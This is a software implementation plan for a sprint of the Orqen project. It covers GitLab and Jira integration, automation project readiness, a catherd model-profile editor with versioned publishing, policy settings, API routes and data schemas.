# Orqen Sprint 2 implementation plan: project catalog and mapping, automation readiness, catherd profile editor, health

This plan builds on PLAN.md decisions D1–D35 and the deviations recorded in DEVIATIONS.md, and reuses their patterns: `with_txn`, `ScopedCollection`, `run_idempotent`, `queue::store` with fencing, operations returning 202, `events::writer::append`, `artifacts::store_blob` + `record_in`, the `OrgScope`/`IfMatch`/`IdempotencyKey` extractors, orval wrapper hooks, and `check:rtl`.

**Personal config check:** I ran catherd only with `CATHERD_HOME` and `CATHERD_CLAUDE_AGENTS_DIR` pointing under `.../scratchpad/catherd-research`. The aggregate sha of `~/.config/catherd` was `7818e850…` before and after all research, and `~/.claude/agents` stayed empty.

---

## 0. Facts verified against the real catherd 1.5.0 binary and its source

Install: `~/.bun/bin/catherd` is a symlink to `~/node_modules/catherd-cli/src/cli.ts`. It is a Bun script (`#!/usr/bin/env bun`), so the child `PATH` must contain Bun.

| Topic | Verified behaviour |
|---|---|
| State dirs | `config = $CATHERD_CONFIG_DIR` or `$CATHERD_HOME/config` or `$XDG_CONFIG_HOME/catherd` or `~/.config/catherd`. `data = $CATHERD_DATA_DIR` or `$CATHERD_HOME/data` or `~/.local/share/catherd`. Agent symlinks go to `$CATHERD_CLAUDE_AGENTS_DIR`, else `$CLAUDE_CONFIG_DIR/agents`, else `~/.claude/agents`. A save creates links there only for native `claude:` rungs. |
| Files | `config/profiles/<name>.json` holds `{schema:1, name, …}`. `config/config.json` holds `{schema, activeProfile}`. `config/projects.json` holds `{schema, bindings{gitToplevel→profile}}`. Also `config/agents/<profile>/*.md`, `config/catalog.override.json` (treat-likes) and `config/credentials.json` (Jev and AA keys). `data/{sources,discovery,locks,logs,repos,…}`. |
| Host detection | Comes from the env: `CATHERD_ORCHESTRATION_HOST`, `CODEX_THREAD_ID`/`CODEX_SESSION_ID`, `CLAUDE_CODE_*`. Conflicting evidence makes the host `unknown`. `--host codex` is required, otherwise `profile show` fails with `roles.architect.rungs needs an orchestration host`. `claude:` rungs are refused on the codex host. |
| Read commands | `profile list --json` returns `[{name,active,repos}]`. `profile show <n> --raw --json` returns the stored document. `profile show <n> --json --host codex` returns `{profile(resolved), active, enforcement, standIns}`. `profile validate <n> --host codex --json` returns `{valid, errors[{path,message,fix?}], warnings[...]}` and exits 1 on errors. `catalog list --json` returns `{total, models[{id(family), name, backend, model, billing, efforts, context, capabilities, roles, listed(bool|null), notes, price, speed, rungs[{rung, enabled(=scored), scores, treatLike, cost{tier,value,mode}, evidence}]}]}`. Today that is 48 models, 206 rungs, 436 KB. |
| Read commands write nothing | On an empty home, `profile list/show/validate/diff` and `catalog list` created no files. |
| Writes | `profile new <n> --host codex` copies the built-in default; architect and verifier have no rungs and are resolved from the host. `profile set --profile <n> --host codex <path> <json>` applies an RFC 7396 merge patch. The patch schema is strict: unknown keys exit 2 with `E_INPUT_INVALID`. The save is validated first; a refusal exits 1 with stderr `error E_CONFIG_INVALID: the profile was not saved: <path>: <msg>; …` and a `fix:` line. A path naming a top-level key (for example `roles`, `failover`) with a JSON object value works. An empty path is refused. `profile rm <n>` refuses the active or a bound profile. |
| Diff | `profile diff A B` lists the changes from B to A, on the resolved profile. Orqen computes its own diff (D55). |
| doctor | `doctor --host codex --json` returns `{host, queue, push, ready, version, checks[{id,label,state: ok\|warn\|fail\|skip\|info,word,detail,fix?}]}` and exits 0 when ready, 3 when not. It ran in about 2 s. It wrote only `data/locks`, `data/logs` and `mcp-boot.lock`. It spawns `catherd mcp` for a tools/list handshake, which reconciles runs in that home, and runs sandbox and HTTPS probes. It makes no model calls. |
| Enums | Roles: architect, verifier, worker, reviewer, ui-reviewer, artist, writer, researcher. Access: read-only, workspace-write, full. Billing keys: codex, claude, claude-code, opencode-go, opencode, cursor, grok, antigravity. Billing modes: chatgpt-plan, claude-plan, subscription, metered. Harness keys: codex, claude-code, opencode, cursor, grok, antigravity. Notify: milestone, finish, blocked. Rung grammar: `<backend>:<model>#<effort>`, backend ∈ harness keys ∪ {claude}, model `^[A-Za-z0-9][^\s#]*$`, effort `^[A-Za-z0-9][\w-]*$`. Profile name: `^[a-z0-9][a-z0-9-]{0,31}$`. |
| Patch shape | `objective` cost\|speed. `jev.use` auto\|off. `billing{key: mode\|null}`. `roles{role:{enabled, access, rungs[], defaultRung\|null, network bool\|null, timeouts{idleMin, wallMin}\|null}}`. `harness{key:{isolated}}`. `failover{rung: rung\|null}`. `budget{minutes, tokens, usd (positive\|null)}`. `timeouts{idleMin, wallMin}`. `preflight{confirm}`. `lock{heavy: int>0\|"cpus/2"}`. `notify[]`. Stored documents are loose (unknown fields survive) but cannot be set through the patch. |
| Validation rules seen | Worker cannot be disabled. A role with no usable rung, an unscored rung without a treat-like, and a native `claude:` rung on the codex host are all errors. An isolated harness without its API key in catherd's env is an error. There is **no** coder/reviewer independence check: Orqen adds it. |
| Model identity | The catalog `id` is a family id shared across backends. For example `gpt-6-luna` covers `codex:gpt-6-luna`, `cursor:gpt-6-luna`, `opencode:opencode/gpt-6-luna` and `opencode:opencode-go/gpt-6-luna`. |
| MCP (from source only, not run) | `profile_set {name, patch}` is atomic and returns structured errors, but `catherd mcp` on initialize takes a boot lock, runs `reconcileAll` (watches and finalizes runs), starts a notifier, and syncs unless `CATHERD_NO_SYNC=1`. |
| Not verified (not run on purpose) | `catalog refresh` (lists models from each backend) and `catalog sync` (public-source network fetch), `profile use`, any real run, the MCP tool calls, and `catherd init` (it runs `bun add -g` and prompts for keys). |

---

## 1. Key decisions (D36–D66)

| # | Topic | Decision | Reason |
|---|---|---|---|
| D36 | GitLab and Jira access in Sprint 2 | Direct REST through `reqwest` in a new `providers` module. Traits are `CodeHost` (SPEC §14 names, Sprint 2 subset: `identity`, `capabilities`, `list_projects_page`, `get_project`, `list_branches`, `get_branch`, `list_tree`, `read_file_raw`, `resolve_commit`) and `IssueSource` subset (`identity`, `capabilities`, `list_projects`, `get_project`, `list_boards`, `get_board`, `check_jql`). Implementations: `providers::gitlab::GitLabRest`, `providers::jira::JiraRest`. RMCP is deferred and will implement the same traits. | Verifiable now against fake HTTP upstreams with custom port and path. MCP needs real tokens and child processes. The traits keep the MCP swap. |
| D37 | HTTP client | Move `build_client` from `probe.rs` into `connections::http::client_for(conn, policy)` (proxy, CA bundle, timeouts, UA). Provider API calls use `redirect::Policy::none()`: any 3xx is `ProviderError{InvalidOutput, code:"unexpected_redirect"}`. GitLab `Link` next URLs must match the API base origin and path prefix. | reqwest strips only `Authorization`/`Cookie` on cross-host redirects, not `PRIVATE-TOKEN`. |
| D38 | Auth matrix | Add a non-secret `auth_username: Option<String>` (≤254) to the connection. **GitLab:** `personal_access_token`/`api_token` send `PRIVATE-TOKEN: <secret>`; `oauth` sends `Bearer`; `basic` is unsupported (auth stage fails `auth_method_unsupported`). **Jira cloud:** `api_token`/`basic` send `Basic b64(auth_username:secret)` (missing username fails `username_required`). **Jira server/data_center:** `personal_access_token` sends `Bearer`; `basic` sends Basic; `oauth` sends Bearer. | A Jira Cloud API token needs the account email. |
| D39 | Provider limits | Add `ProviderLimiter` to `AppState`: `Mutex<HashMap<ConnectionId, Arc<Semaphore>>>` sized `max_concurrency`. Every provider call holds a permit. A 429 becomes `ProviderError{RateLimited, retry_after_ms}` from `Retry-After`. | §4/§16. |
| D40 | Connection test stages | Implement `auth`, `identity`, `capabilities`, `sample_access` for gitlab and jira (details in WP17). Confluence and figma keep the truthful `not_implemented`. Add `ConnStatus::Verified` (all four adapter stages passed). Store system-written snapshots `identity` and `capabilities` (no revision bump). | §4 test stages. |
| D41 | Project discovery | A **cached catalog** in Mongo `catalog_projects`, filled by a `catalog_refresh` job (202 plus SSE progress). It uses GitLab keyset pagination (`pagination=keyset&order_by=id&sort=asc&per_page=100`, `Link rel=next`) and falls back to offset (`X-Next-Page`). Rows not seen in a refresh get `gone=true`. Search runs in Mongo. | §4.1, §13 large paginated tables, stable cursor, testable. Discovery never clones (§19 row 3). |
| D42 | Form lookups | Jira projects, Jira boards and GitLab branches are **live** read-only lookup endpoints (not cached). Errors map to `502 provider_*`. | Small lists; always fresh. |
| D43 | Automation project | `projects` holds an org-scoped automation project with exactly **one primary repo** plus optional related repos, an optional Jira mapping, Confluence refs, commands, protected paths, a contract snapshot ref and a profile binding. The stored flag is `automation_enabled`. The display state is **derived**: `draft` (blockers), `ready` (no blockers, not enabled), `enabled`, `enabled_blocked` (enabled but blockers appeared). | §4.6: never a stale green state. |
| D44 | Repo identity | `RepoIdentity{org, connection_id, provider_project_id}` (exists in `ids.rs`). `primary_repo_key = canonical()` with a unique partial index among active projects. Path, namespace and URL are display snapshots only. | §4, D10. |
| D45 | Commands | `{key (^[a-z][a-z0-9-]{0,31}$, unique), kind: setup\|lint\|typecheck\|test\|build\|custom, argv: [String] (1..=64 items, each 1..=4096 bytes, no NUL, argv[0] non-empty), cwd (repo-relative, normalized, no `..`, no leading `/`, default the package path or "."), env: [{name ^[A-Z_][A-Z0-9_]*$, source: literal{value≤1024} \| host{var}}], timeout_secs 1..=7200, needs_network, needs_docker, origin: user\|contract{snapshot_id, file}, approved: bool, approved_at, fingerprint}`. **No shell strings, ever.** A literal env whose name matches the D34 secret regex is rejected (422; it must be `host`). Changing argv, cwd, env or timeout drops approval unless the same request sets `approved:true`. | §4.5, §14. Credential-backed env is deferred to Sprint 4. |
| D46 | Protected paths | `[{pattern (globset syntax, ≤512, relative), mode: deny\|review, note}]`, max 200, compiled with `globset` 0.4 on save (422 on an invalid glob). Enforcement is Sprint 4. | §7.5. |
| D47 | Repo contract import | **In Sprint 2**, via the GitLab API: resolve the commit, list the root tree (plus the package path), then read the raw files `AGENTS.md, CLAUDE.md, README.md, package.json, Makefile, Cargo.toml, go.mod, pyproject.toml, .gitlab-ci.yml` (each capped at 256 KiB, `truncated` flag). Files are stored as artifacts. Command **suggestions** come only from deterministic parsers: package.json `scripts` with the lockfile-chosen package manager, Makefile targets, Cargo, Go and pytest detection. Markdown and CI files are review-only. Nothing is auto-approved, and the user must "mark reviewed". | §4.4: no implicit trust; covers §19 "doc contains a policy/token instruction becomes data". |
| D48 | Readiness | `projects::readiness::evaluate` is computed **on every read**; the full checklist is in WP24. Enabling re-evaluates inside the enabling transaction and stores `enabled_policy_version_id` and `enabled_profile_version_id`. | §4.6, §20. |
| D49 | Settings hierarchy | New module `policy`: a typed registry of keys (WP21). Layers are product defaults (code, `PRODUCT_DEFAULTS_VERSION=1`), org, project and run (type only). Drafts live in `policy_drafts`; publish creates an immutable `policy_versions` doc. The effective value is resolved per key with its `source`. Locked keys cannot be overridden. | §4 priority, §15 immutable `policy_versions`. |
| D50 | catherd interface | **CLI only, never `catherd mcp`, never `catherd init`.** Reads use the `--json` read commands (verified write-free). Writes are `profile new`, `profile set <topKey> <json>` and `profile rm`. All go through `trait CatherdPort` with `CliCatherd` and `FakeCatherd`. | The MCP boot reconciles runs, starts a notifier and takes the boot lock, which a later Codex host owns. `init` installs packages globally. SPEC: only the official CLI/API, no internal file writes. |
| D51 | Per-org namespace | `{data_dir}/catherd/{org_id}/` holds `home/` (`CATHERD_HOME`), `claude-agents/` (`CATHERD_CLAUDE_AGENTS_DIR`), `work/` (empty non-git cwd) and `tmp/`; all are 0700. The child env starts from `env_clear()` and gets an allowlist (WP22). | §6. Strips host-session evidence and the parent `CATHERD_CONFIG_DIR`/`DATA_DIR` (which beat `CATHERD_HOME`). |
| D52 | Personal catherd access | A separate type `PersonalCatherdEnv` is accepted **only** by `list_profiles` and `show_raw`. Write methods take `&OrgCatherdEnv`, so the compiler prevents writes to personal state. The personal env passes through only Orqen's inherited `CATHERD_HOME/CONFIG_DIR/DATA_DIR`, `XDG_CONFIG_HOME/XDG_DATA_HOME`, `HOME` and `PATH`; tests override it with `ORQEN_PERSONAL_CATHERD_HOME`. | §6, §19 "import/edit does not change personal hash". |
| D53 | Profile storage | The Mongo `model_profiles` doc holds the editable **draft** (raw catherd document plus Orqen meta). `model_profile_versions` are immutable snapshots. Every published version is its **own immutable catherd profile** named `o-{slug}-v{n}` (slug `^[a-z0-9][a-z0-9-]{0,15}$`, so ≤25 chars). Validation materializes into a throwaway staging profile `s-{ulid lowercase}`. Orqen never runs `profile use`, never sets an active profile or repo binding. | §6: a pinned published version per run; rollback is a new version; the personal active profile and bindings are untouched. |
| D54 | Publish | A `profile_publish` job runs create, ordered sets (roles last), `validate --json`, raw read-back with hash equality, then a fenced finalize. It is idempotent on retry (an existing name with a matching hash counts as done). Abandoned or failed attempts are swept (pseudo-code in WP23). | Mongo and filesystem are not one transaction (§15). |
| D55 | Diff | Computed in Rust on raw documents (flatten objects; arrays and scalars are leaves; path as a segment array because rung keys contain dots). `from`/`to` ∈ `draft \| latest \| mpv_…`. | No catherd call; works for drafts. |
| D56 | Reviewer independence | Coder set = worker rungs ∪ their failover stand-ins. Reviewer set = reviewer rungs ∪ their stand-ins. Each rung maps to a catalog family `id` by (backend, model). Any unmatched rung gives `unknown`; any shared family gives `same_model` (validation error); otherwise `independent`. Automation readiness requires `independent`, reviewer and verifier enabled, and an explicit budget choice. | §6 "different model, not different backend name; unknown does not pass". |
| D57 | Catalog availability | Per rung, computed in Rust from the latest `catalog list` snapshot plus the last doctor: `available`, `unknown_listing` (listed=null, allowed with a warning), `not_offered` (listed=false), `no_score` (enabled=false and no treat-like), `backend_missing` (doctor `backend:<b>` state fail, or skip with word `missing`), `role_incompatible` (role ∉ model.roles, for the role filter). Everything except available and unknown_listing is shown **disabled with its reason**, never hidden. A rung in a draft that is absent from the catalog is error `rung_not_in_catalog`. | §6, §13, §19 "unavailable model or wrong name". |
| D58 | Unknown or advanced fields | The draft keeps the full raw document. A walker reports every key that is not settable through the patch as error `unsupported_field` (path), and unknown enum values as `unknown_value`. The Advanced tab shows the raw JSON. A "Remove unsupported fields" action rewrites the draft. Publish is blocked while such errors exist. | §6: unknown fields are visible but never executed. |
| D59 | Host and explicit rungs | Every catherd call passes `--host codex` (constant `ORCHESTRATION_HOST`; an org setting later). Orqen requires **explicit `rungs` for every enabled role**, otherwise error `rungs_required`. | The pinned version must not depend on host-default resolution. Codex App Server is the SPEC host. |
| D60 | Budget choice | The profile meta field `budget_uncapped_ack: bool` lives on the Orqen draft and version only and is never sent to catherd. Automation-ready requires a non-empty `budget` or `budget_uncapped_ack=true`. | §6 "user sets a budget or explicitly chooses no cap". |
| D61 | catherd version window | Supported `>=1.5.0, <1.6.0`, read from `catherd --version`. Outside the window, validate and publish fail with `catherd_version_unsupported` and health shows it. | The patch schema is mirrored from 1.5.0. |
| D62 | Health | `GET /orgs/{orgId}/health` aggregates Mongo, the queue, connections, the catherd runtime, the last doctor and inventory. `POST /catherd/doctor` is a 202 job; the result is stored in `catherd_states` plus an artifact. The global `/api/v1/health` is unchanged. | §13 Maintenance, §14 health. |
| D63 | Test doubles | Fake GitLab and Jira HTTP servers (axum, under the `/gitlab` and `/jira` prefixes) in `tests/common/fake_upstream.rs`. `FakeCatherd` is an in-memory implementation of `CatherdPort` that mirrors merge-patch semantics, used by default. Real-binary tests are `#[ignore]` in `tests/catherd_real_test.rs`, gated by `ORQEN_TEST_CATHERD_BIN`, and always use temp homes. | No real accounts; deterministic CI. |
| D64 | New crates | Only `globset@0.4`. Use `url::form_urlencoded::byte_serialize` to encode the GitLab file path (`/` becomes `%2F`) and `base64` for Basic auth. Bin lookup is a small PATH scan (no `which` crate). | Keeps the dependency tree small. |
| D65 | Schema v2 | `SCHEMA_VERSION = 2`. `migrate` creates `indexes_v1()` + `indexes_v2()` (idempotent). New connection fields get `#[serde(default)]`, so no data migration is needed. | D33. |
| D66 | Web | New shadcn components: `tabs checkbox switch popover command scroll-area accordion radio-group`, each passed through `check:rtl`. Generated orval hooks are used only through thin wrappers in `src/api/hooks/*.ts`. Advanced JSON uses an LTR `Textarea` with parse validation (no Monaco). | Existing pattern. |

---

## 2. Data model and indexes (schema v2)

New ids in `ids.rs` via `define_id!`: `ProjectId "prj"`, `CatalogProjectId "cpj"`, `PolicyVersionId "pol"`, `ModelProfileId "mpf"`, `ModelProfileVersionId "mpv"`, `ContractSnapshotId "rcs"`.

```rust
// connections (additions, all #[serde(default)])
auth_username: Option<String>,
identity: Option<ProviderIdentity { provider_user_id: String, username: String, display_name: Option<String>, verified_at: DateTime }>,
capabilities: Option<CapabilitySnapshot { server_version: Option<String>, deployment_detected: Option<String>,
    token_scopes: Option<Vec<String>>, features: BTreeMap<String, CapState /* available|denied|unsupported|unknown */>, checked_at: DateTime }>,
catalog_summary: Option<{ refreshed_at, project_count: i64, operation_id }>,
// TestSummary gains: tested_material_hash: String  = sha256(canonical{base_url,auth_method,auth_username,proxy_url,custom_ca_pem,allowed_hosts,credential_ref})

// catalog_projects
CatalogProjectDoc { _id: CatalogProjectId, org_id, connection_id, provider_project_id: String, name, path_with_namespace,
  default_branch: Option<String>, web_url: String, archived: bool, visibility: Option<String>, last_activity_at: Option<String>,
  sort_key: String /* lowercase path_with_namespace + "\u{1}" + _id */, search_text: String /* lowercase "name path" */,
  last_seen_refresh: OperationId, gone: bool, first_seen_at, last_seen_at }

// projects
ProjectDoc { _id: ProjectId, org_id, name (1..=120), name_key, description: Option<String ≤2000>,
  mapping: Mapping, primary_repo_key: Option<String>, mapping_check: Option<MappingCheck>,
  commands: Vec<CommandSpec>, protected_paths: Vec<ProtectedPath>,
  latest_contract_snapshot_id: Option<ContractSnapshotId>, reviewed_contract_snapshot_id: Option<ContractSnapshotId>,
  profile_binding: Option<{ profile_id: ModelProfileId, version_id: ModelProfileVersionId, bound_at }>,
  automation_enabled: bool, enabled_at, enabled_policy_version_id: Option<PolicyVersionId>, enabled_profile_version_id: Option<…>,
  active: bool, revision, created_at, updated_at, archived_at }
Mapping { repos: Vec<RepoMapping { role: primary|related, connection_id, provider_project_id, path_snapshot, default_branch_snapshot: Option<String>,
            target_branch: String /* git ref-name subset: ^(?!/)(?!.*\.\.)(?!.*//)[A-Za-z0-9._/-]{1,255}(?<!/)(?<!\.lock)$ */,
            package_path: Option<String> /* normalized relative dir */, note: Option<String> }>,   // max 20, exactly ≤1 primary
          jira: Option<JiraMapping { connection_id, project_id: String, project_key_snapshot: String, board: Option<{id: String, name_snapshot}>, jql: Option<String ≤4000> }>,
          confluence: Vec<ConfluenceRef { connection_id, page_id: Option<String>, space_key: Option<String>, title_snapshot: Option<String> }> /* max 50 */ }
MappingCheck { mapping_hash, checked_at, operation_id, results: Vec<CheckResult { check: String, status: passed|failed|skipped|not_implemented, code: Option<String>, detail }> }

// repo_contract_snapshots
ContractSnapshotDoc { _id, org_id, project_id, repo_key, connection_id, provider_project_id, ref_name, commit_sha,
  files: Vec<{ path, size: i64, sha256, artifact_id, truncated: bool }>, suggestions: Vec<CommandSuggestion { kind, key, argv, cwd, source_file, source_detail }>,
  created_at, operation_id }

// policy_drafts  (_id = "{org}:{org|project}:{scope_id}")
PolicyDraftDoc { _id: String, org_id, scope: { kind: org|project, id: String }, overrides: Document, base_version_id: Option<PolicyVersionId>, revision, updated_at }
// policy_versions (immutable)
PolicyVersionDoc { _id: PolicyVersionId, org_id, kind: org|project|resolved, scope_id: String, number: i64 /* per (kind,scope_id) */,
  schema_version: i32, defaults_version: i32, overrides: Document /* org|project */, resolved: Option<Document> /* resolved only: key -> {value, source} */,
  hash: String, created_at, source_refs: Option<{ org_version_id, project_version_id }> }

// model_profiles
ModelProfileDoc { _id: ModelProfileId, org_id, slug, name (1..=80), description: Option<String>,
  draft: { doc: Document /* raw catherd ProfileDoc without "name" */, meta: { budget_uncapped_ack: bool }, updated_at },
  last_validation: Option<ValidationRecord { draft_hash, catherd_version, valid: bool, errors: Vec<Issue>, warnings: Vec<Issue>,
       orqen_issues: Vec<Issue>, independence: Independence, checked_at, operation_id }>,
  next_number: i64 /* starts 1 */, latest_version_id: Option<ModelProfileVersionId>, source: { kind: blank|clone|import_personal, ref: Option<String> },
  active: bool, revision, created_at, updated_at, archived_at }
Issue { path: Vec<String>, path_display: String, code: String, message: String, fix: Option<String>, origin: orqen|catherd }
Independence { status: independent|same_model|unknown|reviewer_disabled, shared: Vec<String>, unmatched: Vec<String> }

// model_profile_versions (immutable except state transition publishing->published|failed)
ModelProfileVersionDoc { _id, org_id, profile_id, number, state: publishing|published|failed, doc: Document, meta, doc_hash,
  catherd_name: String, catherd_version: String, host: "codex", resolved: Option<Document>, validation: Option<ValidationRecord>,
  source: { kind: draft|rollback, from_version_id: Option<…> }, operation_id, failure: Option<{code, message, issues: Vec<Issue>}>,
  created_at, published_at: Option<DateTime> }

// catherd_states (_id = "catherd:{org}", system-written, no revision)
CatherdStateDoc { _id, org_id, version: Option<String>, last_doctor: Option<{ operation_id, checked_at, ready, checks: Vec<DoctorCheck>, artifact_id }>,
  inventory: Option<{ names: Vec<String>, checked_at }>, catalog: Option<{ artifact_id, refreshed_at, model_count, mode, operation_id }> }
```

`indexes_v2()` (all named):

| Collection | Index |
|---|---|
| `catalog_projects` | unique `org_con_pid {org_id:1, connection_id:1, provider_project_id:1}`; `org_con_sort {org_id:1, connection_id:1, gone:1, sort_key:1}` |
| `projects` | unique partial `org_name_active {org_id, name_key}` where `{active:true}`; unique partial `org_primary_repo {org_id, primary_repo_key}` where `{active:true, primary_repo_key:{$type:"string"}}`; `org_id {org_id, _id}` |
| `repo_contract_snapshots` | `org_project {org_id, project_id, _id}` |
| `policy_drafts` | `org {org_id}` |
| `policy_versions` | unique `org_scope_number {org_id, kind, scope_id, number}`; `org_id {org_id, _id}` |
| `model_profiles` | unique partial `org_slug_active {org_id, slug}` where `{active:true}`; `org_id {org_id, _id}` |
| `model_profile_versions` | unique `org_profile_number {org_id, profile_id, number}`; unique `org_catherd_name {org_id, catherd_name}`; unique partial `one_publishing {org_id, profile_id}` where `{state:"publishing"}`; `org_id {org_id, _id}` |
| `catherd_states` | `org {org_id}` |

`ScopedCollection` gains `find_page_by(filter, sort_field, after_value, limit)` for `sort_key` cursors. The cursor is the base64url of the last `sort_key`, decoded by the existing `decode_cursor`.

---

## 3. API routes

All routes are under `/api/v1/orgs/{orgId}`. `OrgScope` is the first extractor. Mutations need `X-CSRF-Token`. "Idem" means `RequiredIdempotencyKey`. "IM" means `IfMatch` (resource revision). Every route has utoipa annotations with the header params declared as in Sprint 1, and tags `catalog`, `projects`, `policy`, `model-profiles`, `catherd`, `health`. Long work returns `202 OperationDto` with a `Location` header.

| Method + path | Headers | Body → Response |
|---|---|---|
| PATCH `/connections/{conId}` | IM | + `auth_username` (empty string clears) |
| GET `/connections/{conId}/lookup/jira-projects?query&start_at&limit` | — | `{items[{id,key,name}], next_start_at?}` |
| GET `/connections/{conId}/lookup/jira-boards?project_id&start_at&limit` | — | `{items[{id,name,type}], next_start_at?}` (agile 404 gives 422 `capability_unsupported`) |
| GET `/connections/{conId}/lookup/gitlab-branches?provider_project_id&search&limit` | — | `{items[{name,default,protected}]}` |
| POST `/connections/{conId}/catalog/refresh` | Idem | → 202 (dedupe `catalog_refresh:{conId}`) |
| GET `/connections/{conId}/catalog-projects?search&selection=all\|selected\|unselected&include_gone&include_archived&limit&cursor` | — | `Page<CatalogProjectDto{…, project_id?}>` |
| GET `/catalog/summary` | — | `[{connection_id, name, project_count, refreshed_at?, running_operation_id?}]` |
| GET `/projects?search&limit&cursor` | — | `Page<ProjectSummaryDto{id,name,primary_repo{path,connection_id},state,blocker_count,automation_enabled,revision}>` |
| POST `/projects/from-catalog` | Idem | `{connection_id, provider_project_ids[1..=200]}` → 200 `{created[ProjectSummaryDto], existing[{provider_project_id,project_id}], missing[pid]}` |
| GET/PATCH/DELETE `/projects/{prjId}` | IM on PATCH/DELETE | `ProjectDto` (+ETag). DELETE with automation enabled gives 409 `automation_enabled`. |
| PUT `/projects/{prjId}/mapping` | IM | `MappingInput` → ProjectDto |
| POST `/projects/{prjId}/mapping/check` | Idem | → 202 (dedupe `mapping_check:{prjId}`) |
| PUT `/projects/{prjId}/commands` | IM | `{commands[CommandInput]}` → ProjectDto |
| PUT `/projects/{prjId}/protected-paths` | IM | `{rules[…]}` → ProjectDto |
| POST `/projects/{prjId}/contract/import` | Idem | → 202 (dedupe `contract_import:{prjId}`) |
| GET `/projects/{prjId}/contract/snapshots?limit&cursor`, GET `…/snapshots/{rcsId}` | — | `ContractSnapshotDto` (file content via the existing `/artifacts/{artId}/content`) |
| POST `/projects/{prjId}/contract/snapshots/{rcsId}/review` | IM | → ProjectDto |
| PUT `/projects/{prjId}/profile-binding` | IM | `{version_id: mpv\|null}` → ProjectDto (version must be `published` and in this org, else 422 `version_not_published`) |
| GET `/projects/{prjId}/readiness` | — | `ReadinessDto{ready, state, blockers[{code,detail,tab}], warnings[…], evaluated_at}` |
| POST `/projects/{prjId}/automation/enable` | IM + Idem | → ProjectDto, or 409 `project_not_ready` (`errors[{field: blocker code, message: detail}]`) |
| POST `/projects/{prjId}/automation/disable` | IM | → ProjectDto |
| GET `/policy/schema` | — | `[PolicyKeyDto{key,type,enum?,min?,max?,default,locked,project_overridable}]` |
| GET/PUT `/policy/draft`; POST `/policy/publish`; GET `/policy/versions`, `/policy/versions/{polId}`, `/policy/effective` | PUT IM; publish IM + Idem | `PolicyDraftDto{overrides, revision, base_version_id, differs_from_published}`; publish → 201 `PolicyVersionDto`; effective → `[{key,value,source:{layer: product\|org\|project, version_id?, number?},default,locked}]` + `hash` |
| Same set under `/projects/{prjId}/policy/...` | same | project layer |
| GET `/catherd/status` | — | `CatherdStatusDto{available, bin, version?, supported, home_display, last_doctor?, inventory?, catalog?{refreshed_at,model_count}}` |
| GET `/catherd/schema` | — | enums of §0 + `supported_range` + `host` |
| POST `/catherd/doctor` | Idem | → 202 (dedupe `catherd_doctor`) |
| POST `/catherd/catalog/refresh` | Idem | `{mode: list\|listings\|sync}` → 202 (dedupe `catherd_catalog`) |
| GET `/catherd/catalog?role&backend&text&available_only` | — | `CatalogDto{refreshed_at?, models[{family_id,name,backend,model,billing,efforts,roles,listed,context,price?,rungs[{rung,effort,scored,treat_like?,cost_tier?,cost_mode?,availability,reasons[],scores{dim:{value,confidence,source}}}]}]}`; 404-free empty state `{refreshed_at:null, models:[]}` |
| GET `/catherd/personal-profiles` | — | `{available, profiles[{name,active}]}` (read-only subprocess, 10 s timeout) |
| GET/POST `/model-profiles` | POST optional Idem | `{slug,name,description?,from:{kind:blank}\|{kind:version,version_id}}` → 201 `ModelProfileDto` |
| GET/PATCH/DELETE `/model-profiles/{mpfId}` | IM | DELETE while bound to any active project gives 409 `profile_in_use` |
| PUT `/model-profiles/{mpfId}/draft` | IM | `{doc: CatherdProfileDoc (raw JSON ≤64 KiB), meta}` → ModelProfileDto (saving invalid drafts is allowed) |
| GET `/model-profiles/{mpfId}/draft/issues` | — | Orqen-side issues + independence, no catherd call |
| POST `/model-profiles/{mpfId}/validate` | Idem | → 202 (dedupe `profile_validate:{mpfId}`) |
| GET `/model-profiles/{mpfId}/diff?from&to` | — | `DiffDto{from,to,changes[{path[],path_display,kind:added\|removed\|changed,before?,after?}]}` |
| POST `/model-profiles/{mpfId}/publish` | IM + Idem | → 202, or 409 `profile_not_validated` |
| POST `/model-profiles/{mpfId}/rollback` | IM + Idem | `{version_id}` → 202 |
| GET `/model-profiles/{mpfId}/versions?limit&cursor`; GET `/model-profile-versions/{mpvId}` | — | `ModelProfileVersionDto` |
| POST `/model-profiles/import-personal` | Idem | `{personal_name, slug, name}` → 202 (job creates the profile; result `{profile_id}`) |
| GET `/health` | — | `OrgHealthDto{mongo{ok,replica_set}, queue{queued,leased,failed_24h,dead_24h,oldest_queued_age_secs?}, connections[{id,name,provider,status,readiness}], catherd: CatherdStatusDto, runner{alive}}` |

The DTO for `doc` uses `#[schema(value_type = CatherdProfileDoc)] doc: serde_json::Value`, so orval types it while unknown fields still pass through at runtime.

**Events** (all with `subject` and `operation_id` where relevant; payloads redacted):
- `connection.tested` (now includes `identity`/`capabilities` summary), `connection_test.stage`
- `catalog_refresh.progress {connection_id, seen}`, `catalog.refreshed {connection_id, seen, added, gone}`
- `project.created|updated|archived`, `project.mapping_checked`, `project.contract_imported`, `project.contract_reviewed`, `project.profile_bound`, `project.automation_enabled|disabled`
- `policy.draft_updated`, `policy.published`
- `model_profile.created|updated|draft_updated|validated|archived|imported`, `model_profile_version.publishing|published|failed`
- `catherd.doctor_completed`, `catherd.catalog_refreshed`

**New error codes** (`AppError` variants mapped in `IntoResponse`):

| Code | Status | Notes |
|---|---|---|
| `project_not_ready` | 409 | `errors` = blockers |
| `automation_enabled` | 409 | |
| `profile_not_validated` | 409 | |
| `profile_in_use` | 409 | |
| `version_not_published` | 422 | field `version_id` |
| `repo_already_mapped` | 422 | field |
| `provider_mismatch` | 422 | field `connection_id` |
| `credential_required` | 422 | |
| `capability_unsupported` | 422 | |
| `catherd_unavailable` | 503 | |
| `catherd_version_unsupported` | 503 | |
| `catherd_failed` | 502 | detail = redacted first stderr line |

`AppError::Provider(RateLimited)` adds a `Retry-After` header. `JobFailure: From<AppError>` gains `Provider(pe)` → `retryable = pe.retryable()`, `code = "provider_" + kind`, `retry_after`.

---

## 4. Frontend

Routes added to `router.tsx` under `/orgs/:orgId`:

| Route | Page |
|---|---|
| `projects` | `ProjectsPage`: automation projects table, paginated with a "Load more" cursor and search |
| `projects/discover` | `DiscoverPage`: GitLab connection select, Refresh catalog button with live progress, search, filter all/selected/unselected, include archived, paginated table with **checkbox** select (page-level select-all), sticky footer "Add N projects" calling `POST /projects/from-catalog` with one Idempotency-Key per click intent. Selected rows show a "Configured" badge linking to the project. |
